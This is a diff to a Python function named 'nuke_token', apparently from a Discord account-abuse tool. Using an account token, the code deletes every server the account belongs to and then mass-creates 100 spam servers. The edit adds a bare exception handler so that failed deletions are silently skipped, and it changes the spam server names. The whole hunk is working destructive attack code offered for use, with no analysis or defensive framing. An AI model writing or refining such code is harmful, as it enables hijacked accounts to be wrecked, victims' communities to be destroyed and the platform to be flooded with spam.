@@ -394,21 +394,24 @@ def nuke_token():
                 headers=headers,
             )
         headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
-        delete_personal_request = requests.get(
+        try:
+            delete_personal_request = requests.get(
             "https://discord.com/api/v9/users/@me/guilds", headers=headers
-        ).json()
-        for i in delete_personal_request:
-            requests.post(
-                f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
-                headers=headers,
-            )
+            ).json()
+            for i in delete_personal_request:
+                requests.post(
+                    f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
+                    headers=headers,
+                )
+        except:
+            pass
         print(f"{c}[{w}Nuke token{c}] {w}| Leaving all servers finished{c}.")
         print(f"{c}[{w}Nuke token{c}] {w}| Mass creating servers{c}...")
         headers = {"authorization": Token, "user-agent": "bruh6/9"}
         for i in range(int(100)):
             string1=''.join(random.choices(string.ascii_letters, k=1))
             string2=''.join(random.choices(string.ascii_letters, k=1))
-            payload = {"name": f"{string1} {server_name} {string2}"}
+            payload = {"name": f"{string1} | {server_name} | {string2}"}
             spam_server_request = requests.post(
                 "https://canary.discord.com/api/v8/guilds", headers=headers, json=payload
                 )
